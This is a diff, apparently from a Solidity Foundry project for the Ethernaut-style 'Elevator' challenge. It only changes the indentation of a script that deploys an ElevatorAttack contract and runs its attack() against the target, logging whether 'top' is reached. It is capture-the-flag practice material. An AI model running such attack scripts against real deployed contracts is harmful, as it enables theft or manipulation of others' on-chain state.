@@ -10,13 +10,13 @@ contract ElevatorScript is Script {
     ElevatorAttack attacker;
 
     function run() external {
-	vm.startBroadcast();
-	attacker = new ElevatorAttack();
-	console.log("ElevatorAttack Contract deployed to:", address(attacker));
-	console.log("Elevator Contract top reached?", elevator.top());
-	console.log("Attacking...");
-	attacker.attack(address(elevator));
-	console.log("Elevator Contract top reached?", elevator.top());
-	vm.stopBroadcast();
+        vm.startBroadcast();
+        attacker = new ElevatorAttack();
+        console.log("ElevatorAttack Contract deployed to:", address(attacker));
+        console.log("Elevator Contract top reached?", elevator.top());
+        console.log("Attacking...");
+        attacker.attack(address(elevator));
+        console.log("Elevator Contract top reached?", elevator.top());
+        vm.stopBroadcast();
     }
 }
